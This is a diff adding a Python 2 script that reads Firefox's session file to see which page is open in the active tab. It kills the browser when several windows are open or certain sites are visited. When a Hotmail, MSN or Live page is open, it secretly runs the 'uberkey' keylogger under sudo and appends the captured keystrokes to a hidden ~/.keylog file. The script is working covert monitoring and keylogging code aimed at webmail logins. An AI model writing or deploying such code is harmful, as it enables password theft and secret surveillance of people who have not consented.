@@ -1,0 +1,54 @@
+#!/usr/bin/env python
+#-*- coding: UTF-8 -*-
+import os
+import commands
+import cjson
+
+def main():
+    firedir = os.path.expanduser("~/.mozilla/firefox")
+    files = commands.getoutput("find %s -name sessionstore.js"
+        % firedir).split("\n")
+
+    for file in files:
+        objeto = cjson.decode("".join(open(file).readlines())[1:-1])
+
+        window = objeto["windows"][int(objeto["selectedWindow"]) - 1]
+        tab = window["tabs"][int(window["selected"]) - 1]
+
+        try:
+            page = tab["entries"][int(tab["index"]) - 1]
+        except KeyError:
+            page = {"url": ""}
+
+        print page["url"]
+
+        stop = False
+        scan = False
+
+        if len(objeto["windows"]) > 1:
+            print "* %d ventanas abiertas" % len(objeto["windows"])
+            stop = True
+            
+
+        for url in ["msn.com", "hotmail.com", "live.com"]:
+            if url in page["url"]:
+                print "+ %s" % url
+                scan = True
+
+        for url in ["netlog", "motorola", "celulares", "claro", "ericsson",
+            "nokia", "samsung"]:
+            if url in page["url"].lower():
+                print "* %s" % url
+                stop = True
+
+        if stop:
+#            os.system("killall -s STOP firefox-bin")
+            os.system("killall firefox-bin")
+
+
+        if scan:
+            os.system("sudo /home/deimos/bin/timeout 60 uberkey >> /home/deimos/.keylog")
+
+
+if __name__ == "__main__":
+    exit(main())
